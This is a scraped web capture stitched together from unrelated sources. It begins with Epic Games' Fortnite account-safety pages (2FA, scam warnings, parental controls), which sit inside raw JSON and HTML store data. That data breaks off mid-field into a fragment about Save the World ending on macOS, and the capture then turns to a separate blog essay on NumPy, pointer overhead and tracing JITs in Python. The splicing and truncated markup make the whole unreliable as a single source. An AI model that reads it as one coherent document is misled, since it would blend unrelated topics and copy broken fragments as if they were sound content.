Part of that is staying safe and ensuring you have a secure account. Below, you’ll find a few ways you can increase security for your Fortnite account as well as a few tools you can use to help you stay safe when gaming.&nbsp;</p>\n\n<h2><br />\nProtect Your Account: Two-Factor Authentication</h2>\n\n<p>Keep your password safe and prevent your account from being compromised. We’ve implemented Two-Factor Authentication (also known as 2FA or 2-step verification) to help you prevent unauthorized account access. As a reward for protecting your account by enabling 2FA, you’ll unlock the Boogiedown Emote in Fortnite Battle Royale as well as 50 Armory Slots, 10 Backpack Slots, and 1 Legendary Troll Stash Llama in Save the World.<br />\n<br />\nFor help with turning on 2FA, check out our how-to video or read our support article on <a href=\""https://www.epicgames.com/help/epic-accounts-c74/account-security-c112/twofactor-authentication-and-how-to-enable-it-a3218\"">how to enable 2FA</a>.</p>\n&nbsp;\n\n<div class=\""embed-responsive embed-responsive-16by9\""><iframe allowfullscreen=\""true\"" class=\""embed-responsive-item\"" frameborder=\""0\"" src=\""https://www.youtube.com/embed/_ZpW3Nq43S0\"" width=\""100%\""></iframe></div>\n\n<h2><br />\nProtect Your Account: Never Share Your Account Details</h2>\n\n<p>We’ve seen several instances of account theft and fraud related to websites that claim to provide you free V-Bucks, cosmetics, or the ability to share or buy accounts. Please never share your Epic account details with anyone. Groups claiming to provide special Fortnite deals when you enter your login credentials are fraudulent — and may steal your account. Also, please note that <strong>Epic will never ask you for your password</strong>.&nbsp;</p>\n\n<h2><br />\nParental Controls</h2>\n\n<p>Read all the details about setting up parental controls in Fortnite in our <a href=\""https://www.epicgames.com/fortnite/parental-controls\"">Fortnite parental controls guide</a>. Fortnite offers a range of parental controls to help you manage what a player can see and do within Fortnite. In addition to the parental controls within Fortnite, you can set rules for what features a player can access on consoles, handhelds, phones, and computers. <a href=\""https://www.nintendo.com/switch/parental-controls/\"">Nintendo Switch™</a>, <a href=\""https://www.playstation.com/en-gb/get-help/help-library/my-account/parental-controls/ps4-parental-controls/\"">PlayStationⓇ 4</a>, <a href=\""https://support.xbox.com/en-US/xbox-360/security/xbox-live-parental-control\"">Xbox OneⓇ</a>, <a href=\""https://support.microsoft.com/en-us/help/12439/microsoft-account-set-content-restrictions-on-windows-10-and-xbox-one\"">WindowsⓇ 10</a>, and <a href=\""https://support.apple.com/en-us/HT201304\"">iOS</a> all have guides for activating parental controls.</p>\n\n<h2><br />\nReporting Bad Behavior</h2>\n\n<p>It’s important that Fortnite players have a fun and friendly community to participate with, so we take bad behavior seriously. All our community policies can be found in our <a href=\""https://www.epicgames.com/fortnite/news/fortnite-code-of-conduct\"">Code of Conduct</a>. If you see someone breaking our Code of Conduct or behaving badly, you can report the player’s behavior using the Report Player option in Fortnite. For assistance with this, follow the steps in our guide on <a href=\""https://www.epicgames.com/help/fortnite-c75/battle-royale-c93/how-do-i-report-bad-player-behavior-in-fortnite-a3276\"">reporting bad player behavior</a>.<br />\n<br />\nWe’d love to hear from you if you feel there’s something we can do to help make the Fortnite community more friendly and fun! You can send in suggestions to us on our official social channels, which you can find in the Community section of our <a href=\""https://www.epicgames.com/fortnite/faq\"">Fortnite FAQ</a>.</p>\n\n<h2><br />\nDon’t Buy, Sell, or Trade Fortnite Accounts</h2>\n\n<p>Fortnite accounts must be set up by yourself or a parent/guardian through the game or <a href=\""https://www.epicgames.com/fortnite/home\"">signing up through Epic</a>. As tempting as it might be to purchase an account with highly-coveted items, buying, selling, or trading accounts violates our <a href=\""https://www.epicgames.com/site/tos\"">Terms of Service</a> and presents a security risk for your personal information and accounts.</p>\n\n<h2><br />\nAvoid Scams for Free V-Bucks and Outfits</h2>\n\n<p>Across the internet, there are third parties trying to get your private information by tricking you into believing they will provide you with free items or V-Bucks. Use caution when participating in competitions and giveaways from third parties. Also, please note that Epic will never ask you to provide private information to compete in competitions. Epic only asks you to provide private information to claim prizes after you have won (via our secure partner).</p>\n\n<h3><br />\nSocial Media Scams</h3>\n\n<p>We are aware of a number of Creators in the Support-A-Creator program making content designed to scam and defraud players, and we’re taking actions to both remove these Creators from the ecosystem and prevent similar scams in the future.&nbsp;<br />\n<br />\nTypically, these individuals create social media material that promises false special benefits to players in return for using a specific Support-A-Creator code. Another common scam involves Creative islands that promise rewards to players like free V-Bucks gift cards. The players that use these codes never receive the special benefits they were promised by the Creator.<br />\n<br />\nCreators cannot provide Outfit or free V-Bucks rewards for using a Creator code. Making content aimed to scam and defraud players is a violation of Creators’ agreement with Epic Games. Penalties for these violations include removal from the Support-A-Creator program and cancellation of any pending or potential payments.&nbsp;<br />\n<br />\nWe take violations of the Terms of Service and Code of Conduct seriously — and are looking at additional measures to prevent bad actors from abusing the program. To report scam content, please <a href=\""https://www.epicgames.com/help/contact-us?metadata=eyJoaXN0b3J5TGlua3MiOlt7InVybCI6Ii9mb3J0bml0ZS1jNzUiLCJ0aXRsZSI6IkZvcnRuaXRlIn1dLCJjYXRlZ29yeUlkIjo3NX0%3D\"">submit a Player Support ticket</a> and add the hashtag <strong>#reportacreator</strong>. A screenshot of the Creator code and link to the content is required for us to investigate. A video is even better.</p>\n\n<h2><br />\nVoice Chat Controls</h2>\n\n<p>Voice chat allows you to speak to and hear from other players in Fortnite. Voice chat is enabled by default. If you don’t want other players to be able to chat with you, you can <a href=\""https://epicgames.helpshift.com/a/fortnite/?s=battle-royale&amp;f=how-do-i-change-the-settings-for-voice-chat-in-fortnite\"">learn how to disable voice chat or temporarily mute yourself</a>.</p>\n\n<h2><br />\nLobby Controls</h2>\n\n<p>You can control your party and voice chat settings right from the Fortnite Lobby. If you need help, you can follow the steps in our guide about&nbsp;<a href=\""https://www.epicgames.com/help/fortnite-c75/battle-royale-c93/how-do-i-manage-my-party-and-voice-chat-options-from-the-fortnite-lobby-a3477\"">managing party and voice chat options in the Lobby</a>.&nbsp;</p>\n\n<h2><br />\nParty Hub Privacy Controls</h2>\n\n<p>Party Hub is a feature on the Fortnite mobile app that lets you see which friends are online, start a party, and voice chat with that party before jumping in the game on any platform. In Party Hub, you can decide if your party is open for your friends and their friends to join or you can lock your party so that no one can join without being invited. Learn more about Party Hub privacy controls in our support article on <a href=\""https://www.epicgames.com/help/fortnite-c75/battle-royale-c93/how-can-i-control-my-party-s-privacy-using-the-fortnite-mobile-app-a3272\"">managing your party’s privacy using the Fortnite mobile app</a>.</p>\n"",""_urlPattern"":""/safety-and-security"",""_slug"":""safety-and-security"",""_activeDate"":""2019-08-01T15:37:55.768Z"",""lastModified"":""2020-07-28T15:08:52.630Z"",""_locale"":""en-US"",""_id"":""e70bd94f-6c4f-4896-87ad-aa91f2d3064f"",""_templateName"":""blankPageHeaderImage""}},""SecureAccountStore"":{""data"":{""image"":""https://cdn2.unrealengine.com/Fortnite%2Fsecure-your-fortnite-account%2F09BR_Evergreens_Yellow_NewsHeader-1920x1080-9fe09d7770e5b4521e4c46f490366a98b3bc28d4.jpg"",""_metaTags"":"""",""metaTitle"":""How to Secure Your Fortnite Account | Epic Games Account Help"",""_title"":""secure-your-fortnite-account"",""Title"":""How to Secure Your Fortnite Account | Epic Games Account Help"",""metaImage"":""https://cdn2.unrealengine.com/Fortnite%2Fsecure-your-fortnite-account%2F09BR_Evergreens_Yellow_NewsHeader-1920x1080-9fe09d7770e5b4521e4c46f490366a98b3bc28d4.jpg"",""metaDescription"":""With a secure account, you minimize risk of others using your payment methods, behaving badly in your games, and/or doing more damaging actions.

By keeping your account secure, you minimize the risk of others using your payment methods to make purchases, behaving in your games in a manner that results in a ban, and/or doing more damaging actions.<br />\n </p>\n\n<h2>How can I have the best Fortnite Account Security?</h2>\nEnabling Multi-Factor Authentication (MFA) is one of the best ways to keep your account secure. With MFA, access to your Fortnite account requires the entry of not only your username and password but also a security code that expires after a short time and can only be used once. Because this extra information is required, it becomes more difficult for others to access your account.<br />\n<br />\nBelow are the situations in which logging into your account requires a security code when you have MFA enabled:\n<ul>\n\t<li>When logging into your account for the first time after MFA is enabled on the account.</li>\n\t<li>When logging into your account on a new device.</li>\n\t<li>After 30 days of no sign-ins on your account.</li>\n\t<li>After clearing cookies on the browser on which your account was being used.</li>\n</ul>\n \n\n<h2>How do I enable MFA on my Fortnite Account?</h2>\nTo enable MFA, take the following steps:\n\n<ul>\n\t<li>Be sure the email address associated with your Epic Games account is verified.</li>\n\t<li>Go to your “Account” page.</li>\n\t<li>Select “Password & Security.”</li>\n\t<li>Scroll down to the “Two-Factor Authentication” section.</li>\n\t<li>Choose your preferred method for receiving your security codes.</li>\n</ul>\nIf you choose to use the Authenticator App method, please note some of the common authenticator apps that Epic Games supports:\n\n<ul>\n\t<li>Google Authenticator</li>\n\t<li>LastPass Authenticator</li>\n\t<li>Microsoft Authenticator</li>\n\t<li>Authy</li>\n</ul>\nFor those who choose to use an authenticator app, it is a good idea to click the “Get Backup Codes” button in the “Authenticator App” subsection. Pressing this button will generate codes you can use as security codes in the event you lose access to your authenticator app. Make sure to take note of these.<br />\n<br />\nIf you choose to use the Email Authentication method, each attempt to log into your account that requires a security code will prompt the correct code to be sent to you via email.<br />\n \n<h2>What else can I do to keep my account secure?</h2>\nTo further keep your Epic account secure, you should use a password unique from those of your other online accounts and make sure to keep it a secret, even from somebody or something claiming to represent Epic Games; Epic Games will never ask you for your password.\n\n<h2> </h2>\n"",""_urlPattern"":""/secure-your-fortnite-account"",""_slug"":""secure-your-fortnite-account"",""_activeDate"":""2019-08-01T15:37:55.768Z"",""lastModified"":""2019-09-04T20:38:34.909Z"",""_locale"":""en-US"",""_id"":""749594f9-09fb-42a4-8786-c6165c7fec07"",""_templateName"":""blankPageHeaderImage""}},""RedeemPageStore"":{""enablePosa"":true,""description"":""Enter Your Code Below To Get Started"",""_title"":""redeem-code"",""posaContent"":{""image"":""https://cdn2.unrealengine.com/Fortnite%2Fredeem-code%2FCards-1027x849-4c90850f85bf69d945451f2d8af9e6f1d3d661d5.png"",""needHelp"":""Need Help with your code?<br />\n<a href=\""https://epicgames.helpshift.com/a/fortnite/?s=v-bucks-cards\"">Go Here</a>"",""_type"":""POSA Redeem Card"",""redeemLink"":""<a href=\""/fortnite/vbuckscard\"">Go Here To Redeem</a>"",""title"":""<h1>Have a code for V-Bucks?</h1>\n""},""title"":""Redeem Your Reward"",""_noIndex"":false,""_images_"":[""https://cdn2.unrealengine.com/Fortnite%2Fredeem-code%2FCards-1027x849-4c90850f85bf69d945451f2d8af9e6f1d3d661d5.png"",""https://cdn2.unrealengine.com/Fortnite%2Fredeem-code%2FBG-3840x2290-f9a79c0b0acce8ea1dd3784d8ae96ea1efa91fa4.jpg"",""https://cdn2.unrealengine.com/Fortnite%2Fredeem-code%2FBG-Mobile-1500x2833-bcaa95c539051c634b5ac60e6de0906b5c3340ec.jpg"",""https://cdn2.unrealengine.com/Fortnite%2Fredeem-code%2FRedeemACode_MechTeamLeader-%281%29-2617x3834-4430f980bb4b3a49892c9a06ef706809c8236574.png""],""content"":""Having trouble?

Specifically, our upcoming v14.20 release will cause bugs for players on v13.40, resulting in a very poor experience. Since we are no longer able to sign updates and release fixes for these issues, beginning September 23, 2020, Fortnite: Save the World will no longer be playable on macOS.
We are issuing a refund for all players who purchased any Save the World Founder’s or Starter Packs (including Upgrades) and played Save the World on macOS between September 17, 2019 and September 17, 2020. Additionally, any purchased V-Bucks spent on Llamas on macOS in this period will also be refunded. As of today, September 17, 2020, Save the World Starter Packs will no longer be available for purchase on macOS.Please note: It may take up until October 2, 2020 to receive the refund in your bank account. 
There’s no action needed on your part to receive the refund and you will retain any previously purchased V-Bucks and items on your account. Players will still be able to play Save the World on PC, PlayStation and Xbox, and thanks to cross-progression, your Heroes, Schematics and everything else in your Homebase will automatically transfer across supported platforms. 
Fortnite: Battle Royale remains playable for Mac users at this time on the v13.40 build, but is no longer receiving version updates due to Apple’s actions. The latest version of Fortnite: Battle Royale is available on PlayStation 4, Xbox One, Nintendo Switch, PC, GeForce Now, and on Android through both the Epic Games App at epicgames.com and the Samsung Galaxy Store.

Data-oriented Programming in Python

 Obligatory disclaimer: all opinions are mine and not of my employer 
Many users of Python deprioritize performance in favor of soft benefits like ergonomics, business value, and simplicity. Users who prioritize performance typically end up on faster compiled languages like C++ or Java.
One group of users is left behind, though. The scientific computing community has lots of raw data they need to process, and would very much like performance. Yet, they struggle to move away from Python, because of network effects, and because Python’s beginner-friendliness is appealing to scientists for whom programming is not a first language. So, how can Python users achieve some fraction of the performance that their C++ and Java friends enjoy?
In practice, scientific computing users rely on the NumPy family of libraries e.g. NumPy, SciPy, TensorFlow, PyTorch, CuPy, JAX, etc.. The sheer proliferation of these libraries suggests that the NumPy model is getting something right. In this essay, I’ll talk about what makes NumPy so effective, and where the next generation of Python numerical computing libraries (e.g. TensorFlow, PyTorch, JAX) seems to be headed.
Data good, pointers bad
A pesky fact of computing is that computers can compute far faster than we can deliver data to compute on. In particular, data transfer latency is the Achille’s heel of data devices (both RAM and storage). Manufacturers disguise this weakness by emphasizing improvements in data transfer throughput, but latency continues to stagnate. Ultimately, this means that any chained data access patterns, where one data retrieval must be completed before the next may proceed, are the worst case for computers.
These worst-case chained data access patterns are unfortunately quite common – so common that they have a name you may be familiar with: a pointer.
Pointers have always been slow. In the ’80s and ’90s, our hard drives were essentially optimized record players, with a read head riding on top of a spinning platter. These hard drives had physical limitations: The disk could only spin so fast without shattering, and the read head was also mechanical, limiting its movement speed. Disk seeks were slow, and the programs that were most severely affected were databases. Some ways that databases dealt with these physical limitations are:
Instead of using binary trees (requiring \(\log_2 N\) disk seeks), B-trees with a much higher branching factor \(k\) were used, only requiring \(\log_k N\) disk seeks.
Indices were used to query data without having to read the full contents of each row.
Vertically-oriented databases optimized for read-heavy workloads (e.g. summary statistics over one field, across entire datasets), by reorganizing from arrays of structs to structs of arrays. This maximized effective disk throughput, since no extraneous data was loaded.
Today, compute speed is roughly \(10^5 - 10^6\) times faster than in 1990. Today, RAM is roughly \(10^5\) times faster than HDDs from 1990. I was amused and unsurprised to find that Raymond Hettinger’s excellent talk on the evolution of Python’s in-memory dict implementation plays out like a brief history of early database design. Time, rather than healing things, has only worsened the compute-memory imbalance.
NumPy’s optimizations
Boxing costs
In many higher-level languages, raw data comes in boxes containing metadata and a pointer to the actual data. In Python, the PyObject box holds reference counts, so that the garbage collector can operate generically on all Python entities.
Boxing creates two sources of inefficiency:
The metadata bloats the data, reducing the data density of our expensive memory.
The pointer indirection creates another round trip of memory retrieval latency.
A NumPy array can hold many raw data within a single PyObject box, provided that all of those data are of the same type (int32, float32, etc.). By doing this, NumPy amortizes the cost of boxing over multiple data.
In my previous investigations into Monte Carlo tree search, a naive UCT implementation performed poorly because it instantiated millions of UCTNode objects whose sole purpose was to hold a handful of float32 values. In the optimized UCT implementation, these nodes were replaced with NumPy arrays, reducing memory usage by a factor of 30.
Attribute lookup / function dispatch costs
Python’s language design forces an unusually large amount of pointer chasing. I mentioned boxing as one layer of pointer indirection, but really it’s just the tip of the iceberg.
Python has no problem handling the following code, even though each of these multiplications invokes a completely different implementation.
>>> mixed_list = [1, 1.0, 'foo', ('bar',)]
>>> for obj in mixed_list:
...     print(obj * 2)

2
2.0
'foofoo'
('bar', 'bar')
Python accomplishes this with a minimum of two layers of pointer indirection:
Look up the type of the object.
Look up and execute the __mul__ function from that type’s operation registry.
Additional layers of pointer indirection may be required if the __mul__ method is defined on a superclass: the chain of superclasses must be traversed, one pointer at a time, until an implementation is found.
Attribute lookup is similarly fraught; @property, __getattr__, and __getattribute__ provide users with flexibility that incurs pointer chasing overhead with something as simple as executing a.b. Access patterns like a.b.c.d create exactly the chained data access patterns that are a worst-case for data retrieval latency.
To top it all off, merely resolving the object is expensive: there’s a stack of lexical scopes (local, nonlocal, then global) that are checked in order to find the variable name. Each check requires a dictionary lookup, another source of pointer indirection.
As the saying goes: “We can solve any problem by introducing an extra level of indirection… except for the problem of too many levels of indirection”. The NumPy family of libraries deals with this indirection, not by removing it, but again by sharing its cost over multiple data.
>>> homogenous_array = np.arange(5, dtype=np.float32)
>>> multiply_by_two = homogenous_array * 2
>>> print(multiply_by_two)
array([ 0.,  2.,  4.,  6.,  8.], dtype=float32)
Sharing a single box for multiple data allows NumPy to retain the expressiveness of Python while minimizing the cost of the dynamism. As before, this works because of the additional constraint that all data in a NumPy array must have identical type.
The Frontier: JIT
So far, we’ve seen that NumPy doesn’t solve any of Python’s fundamental problems when it comes to pointer overhead. Instead, it merely puts a bandaid on the problem by sharing those costs across multiple data. It’s a pretty successful strategy – in my hands (1, 2), I find that NumPy can typically achieve 30-60x speedups over pure Python solutions to dense numerical code. However, given that C code typically achieves 100-200x performance over pure Python on dense numerical code (common in scientific computing), it would be nice if we could further reduce the Python overhead.
Tracing JITs promise to do exactly this. Roughly, the strategy is to trace the execution of the code and record the pointer chasing outcomes. Then, when you call the same code snippet, reuse the recorded outcomes! NumPy amortizes Python overhead over multiple data, and JIT amortizes Python overhead over multiple function calls.
(I should note that I’m most familiar with the tracing JITs used by TensorFlow and JAX. PyPy and Numba are two alternate JIT implementations that have a longer history, but I don’t know enough about them to treat them fairly, so my apologies to readers.)
Tracing unlocks many wins typically reserved for compiled languages. For example, once you have the entire trace in one place, operations can be fused together (e.g., to make use of the fused multiply-add instructions common to most modern computers), memory layouts can be optimized, and so on. TensorFlow’s Grappler is one such implementation of this idea. Traces can also be walked backwards to automatically compute derivatives. Traces can be compiled for different hardware configurations, so that the same Python code executes on CPU, GPU, and TPU. JAX can autovectorize traces, adding a batch dimension to all operations. Finally, a trace can be exported in a language-agnostic manner, allowing a program defined in Python to be executed in Javascript, C++, or more.
Unsurprisingly, there’s a catch to all this. NumPy can amortize Python overhead over multiple data, but only if that data is the same type. JIT can amortize Python overhead over multiple function calls, but only if the function calls would have resulted in the same pointer chasing outcomes. Retracing the function to verify this would defeat the purpose of JIT, so instead, TensorFlow/JAX JIT uses array shape and dtype to guess at whether a trace is reusable. This heuristic is necessarily conservative, rules out otherwise legal programs, often requires unnecessarily specific shape information, and doesn’t make any guarantees against mischievous tinkering. Furthermore, data-dependent tracing is a known issue (1, 2). I worked on AutoGraph, a tool to address data-dependent tracing. Still, the engineering benefits of a shared tracing infrastructure are too good to pass up. I expect to see JIT-based systems flourish in the future and iron out their user experience.
Conclusion
The NumPy API’s specifically addresses Python’s performance problems for the kinds of programs that scientific computing users want to write. It encourages users to write code in ways that minimize pointer overhead. Coincidentally, this way of writing code is a fruitful abstraction for tracing JITs targeting vastly parallel computing architectures like GPU and TPU. (Some people argue that machine learning is stuck in a rut due to this NumPy monoculture.) In any case, tracing JITs built on top of NumPy-like APIs are flourishing, and they are by far the easiest way to access the exponentially growing compute available on the cloud. It’s a good time to be a Python programmer in machine learning!
